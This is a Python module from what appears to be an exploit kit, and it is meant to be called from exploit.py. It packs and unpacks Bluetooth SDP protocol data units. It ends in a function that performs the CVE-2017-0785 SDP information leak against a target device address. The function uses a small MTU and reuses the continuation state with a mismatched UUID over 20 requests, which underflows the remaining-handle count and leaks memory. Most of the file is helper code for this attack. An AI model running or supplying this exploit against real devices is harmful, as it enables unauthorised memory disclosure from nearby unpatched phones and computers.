"""
This module provides functions for interacting with a remote device via SDP.
"""

# No direct invocation of this module
if __name__ == "__main__":
    import sys
    sys.exit("This module must not be invoked directly. Invoke exploit.py instead.")

import btsock
import random
import struct
import utility_stuff as utils

# Some magic numbers and IDs defined in Bluetooth specification
L2CAP_UUID = 0x0100
ATT_UUID = 0x0007

# This is required to assure than the SDP respones are splitted to multiple fragments,
# thus assuering that cont_state is attached to the responses.
MIN_MTU = 48
SDP_PSM = 1

# Functions for packing PDU headers into a struct and unpacking them again
pack_sdp_pdu_hdr, unpack_sdp_pdu_hdr, sizeof_sdp_pdu_hdr = \
    utils.create_struct_funcs('>', (
        ('pdu_id', 'B', {
            'SDP_SVC_SEARCH_REQ': 0x02,
            'SDP_SVC_SEARCH_RSP': 0x03,
            'SDP_SVC_ATTR_REQ': 0x04,
            'SDP_SVC_ATTR_RSP': 0x05,
            'SDP_SVC_SEARCH_ATTR_REQ': 0x06,
            'SDP_SVC_SEARCH_ATTR_RSP': 0x07,
        }),
        ('tid', 'H'),
        ('plen', 'H'),
    ))

def pack_sdp_pdu(pdu_id, payload, tid=None, plen=None):
    """
    Packs a PDU for the SDP protocol and returns the resulting header and payload
    of the PDU.

    Params:
        - `pdu_id` - ID of the PDU
        - `payload` - The actual data to be packed
        - `tid` - The tid of the PDU, If not specified, a random tid will be chosen
        - `plen` - Length of the payload to be written into the header. If not
                   given, the lenght will be calculated from `payload`.

    Returns:
        The header and payload of the PDU
    """
    if tid is None:
        tid = random.randint(0, 0xffff)
    if plen is None:
        plen = len(payload)
    hdr = pack_sdp_pdu_hdr(pdu_id=pdu_id, tid=tid, plen=plen)
    return hdr + payload

def unpack_sdp_pdu(data, strict=True):
    """
    Unpacks the SDP PDU stored in `data` and returns its unpacked contents as
    struct.

    Params:
        - `data` - The actual PDU to unpack
        - `strict` - If `True` (default), the function throws an AssertionError
                     if the length attribute of the header is not valid (which
                     means that the length attribute and the length of the header
                     itself does not equal the length of the whole PDU).

    Returns:
        The unpacked PDU

    Throws:
        - AssertionError if `Strict` is `True` and the length attribute is not
          valid
    """
    hdr_size = sizeof_sdp_pdu_hdr()
    assert len(data) >= hdr_size
    result = unpack_sdp_pdu_hdr(data[:hdr_size])
    if strict:
        assert len(data) == hdr_size + result['plen']
    result['payload'] = data[hdr_size:]
    return result

def pack_seq8(payload):
    """
    Packs the payload as a SEQ8 type (sequence of bytes) and returns the
    resulting binary string.

    Params:
        - `payload` - The actual data to pack

    Returns:
        The packed data as binary string

    Throws:
        - AssertionError if the `payload` is longer than 256 bytes
    """
    assert len(payload) < 0x100
    SDP_SEQ8 = 0x35
    return ''.join([chr(c) for c in (SDP_SEQ8, len(payload))]) + payload

def pack_uuid16(value):
    """
    Packs the payload as a UUID16 type (2 bytes UUID) and returns the
    resulting binary string.

    Params:
        - `value` - The actual data to pack

    Returns:
        The packed data as binary string

    Throws:
        - AssertionError if `value` is not in range 0 - 65535
    """
    assert 0 <= value <= 0xffff
    SDP_UUID16 = 0x19
    return struct.pack('>BH', SDP_UUID16, value)

def pack_uuid32(value):
    """
    Packs the payload as a UUID32 type (4 bytes UUID) and returns the
    resulting binary string.

    Params:
        - `value` - The actual data to pack

    Returns:
        The packed data as binary string

    Throws:
        - AssertionError if `value` is not in range 0 - 2^32
    """
    assert 0 <= value <= 0xffffffff
    SDP_UUID32 = 0x1A
    return struct.pack('>BI', SDP_UUID32, value)

def pack_uint32(value):
    """
    Packs the payload as a UINT32 type (4 bytes unsigned integer) and returns the
    resulting binary string.

    Params:
        - `value` - The actual data to pack

    Returns:
        The packed data as binary string

    Throws:
        - AssertionError if `value` is not in range 0 - 2^32
    """
    assert 0 <= value <= 0xffffffff
    SDP_UINT32 = 0x0A
    return struct.pack('>BI', SDP_UINT32, value)

def pack_uint16(value):
    """
    Packs the payload as a UINT16 type (2 bytes unsigned integer) and returns the
    resulting binary string.

    Params:
        - `value` - The actual data to pack

    Returns:
        The packed data as binary string

    Throws:
        - AssertionError if `value` is not in range 0 - 65535
    """
    assert 0 <= value <= 0xffff
    SDP_UINT16 = 0x09
    return struct.pack('>BH', SDP_UINT16, value)

def pack_services(services):
    """
    Packs a list of SDP service identifiers into a bytes sequence (SEQ8) and
    returns the resulting sequence.

    Params:
        - `services` - The service identifiers to pack

    Returns:
        The service IDs packed as binary string (SEQ8)
    """
    return pack_seq8(b''.join(map(pack_uuid16, services)))

def pack_attribute(attribute):
    """
    Packs a SDP attribute into a UINT16 (if `attribute is not a tuple) or a
    UINT32 (if `attribute` is a tuple).

    Params:
        - `attribute` - The attribute to pack (tuple or integer)

    Returns:
        The attribute packed as UINT32 (if `attribute` is tuple) or UINT16 (otherwise).
    """
    if type(attribute) is tuple:
        # Attribute range
        start, end = attribute
        assert 0 <= start <= 0xffff
        assert 0 <= end <= 0xffff
        return pack_uint32(start << 16 | end)
    return pack_uint16(attribute)

def pack_attributes(attributes):
    """
    Packs multiple SDP attributes by calling `pack_attribute` on each of them
    and concatenating the results to a byte sequence.

    Params:
        - `attributes` - A list of SDP attributes to pack

    Returns:
        The packed attributes as a byte sequence (SEQ8)
    """
    return pack_seq8(b''.join(map(pack_attribute, attributes)))

def pack_search_attr_request(services, attributes, max_response_size=0xffff, cstate=b''):
    """
    Packs a PDU for a attribute search request via SDP.

    Params:
        - `services` - The service UUIDs to search for
        - `attributes` - Attributes of the services to search for
        - `max_response_size` - Maximum size of the response (default: 0xFFFF)
        - `cstate` - The continuation state of SDP to send with the request (default: empty)

    Returns:
        The packed PDU
    """
    # Need a UUID that we're going to find
    payload = pack_services(services)
    # Max response size
    payload += struct.pack('>H', max_response_size)
    payload += pack_attributes(attributes)
    # State
    payload += chr(len(cstate)) + cstate
    return pack_sdp_pdu('SDP_SVC_SEARCH_ATTR_REQ', payload)

def unpack_search_attr_response(response):
    """
    Unpacks the response of a service attribute search via SDP (response of sending
    the result of `pack_search_attr_request`).

    Params:
        - `response` - The response received from the remote device

    Returns:
        The unpacked response as a dictionary.

    Throws:
        - AssertionError if the response and its length attribute is not valid
    """
    assert len(response) >= 2
    result = {}
    result['len'] = struct.unpack_from('>H', response)[0]
    assert len(response) >= 2 + result['len'] + 1
    result['payload'] = response[2:2 + result['len']]
    cstate_len = response[2 + result['len']]
    result['cstate'] = response[2 + result['len'] + 1:]
    assert len(result['cstate']) == cstate_len
    return result

def pack_search_request(uuid, max_replies = 0xffff, cstate = b''):
    """
    Packs a search request for a specific service via SDP.

    Params:
        - `uuid` - The UUID of the service to search for
        - `max_replies` - Maximum number of records in response (default: 0xFFFF)
        - `cstate` - The continuation state to send with the request (default: empty byte)

    Returns:
        The packed request
    """
    payload = pack_seq8(pack_uuid16(uuid))
    # Max replies, in records (each one is uint32)
    payload += struct.pack('>H', max_replies)
    # State
    payload += chr(len(cstate)) + cstate
    a = pack_sdp_pdu('SDP_SVC_SEARCH_REQ', payload)
    return a

def unpack_search_response(response):
    """
    Unpacks a SDP search response and returns its contents as dictionary.

    Params:
        - `response` - The actual reponse data

    Returns:
        The unpacked response as dictionary

    Throws:
        - AssertionError of the response format is not valid
    """
    assert len(response) >= 5
    result = {}
    result['total_len'], result['current_len'] = \
        struct.unpack_from('>HH', response)
    result['records'] = struct.unpack_from('>' + ('I' * result['current_len']),
                                           response[4:])
    cstate_len = response[4 + len(result['records']) * 4]
    result['cstate'] = response[4 + len(result['records']) * 4 + 1:]
    assert chr(len(result['cstate'])) == cstate_len
    return result

def do_search_attr_request_full(socket, services, attributes, max_response_size=0xffff):
    """
    Performs a full attribute search via SDP and returns tuples of requests and
    responses until there are no further responses for the initial request.

    Params:
        - `socket` - The socket to use for the requests
        - `services` - The services to search for
        - `attributes` - The attributes to search for
        - `max_response_size` - The maximum number of bytes in a single response (default: 0xFFFF)

    Returns:
        Yields tuples of requests and responses until the remote devices does
        not send any more responses (continuation state is empty).
    """
    cstate = b''
    while True:
        request = pack_search_attr_request(services=services,
                                           attributes=attributes,
                                           max_response_size=max_response_size,
                                           cstate=cstate)
        socket.send(request)
        response = unpack_sdp_pdu(socket.recv(4096))
        response['payload'] = unpack_search_attr_response(response['payload'])
        cstate = response['payload']['cstate']
        yield (request, response)
        if cstate == b'':
            break

# This function assumes that L2CAP_UUID response would be larger than ATT_UUID response
# (This will than lead to the underflow of rem_handles)
def do_sdp_info_leak(dst, src):
    """
    Performs the SDP information leak CVE-2017-0785 and returns the result.

    Params:
        - `dst` - The target to exploit
        - `src` - The sender's own bluetooth address

    Returns:
        The leaked data as a two-dimensional array
    """
    socket = btsock.l2cap_connect((dst, SDP_PSM), (src, 0), MIN_MTU)
    socket.send(pack_search_request(L2CAP_UUID))
    response = unpack_sdp_pdu(socket.recv(4096))
    response['payload'] = unpack_search_response(response['payload'])
    result = []
    for i in range(20):
        cstate = response['payload']['cstate']
        assert cstate != b''
        socket.send(pack_search_request(ATT_UUID, cstate=cstate))
        response = unpack_sdp_pdu(socket.recv(4096))
        response['payload'] = unpack_search_response(response['payload'])
        result.append(response['payload']['records'])
    return result

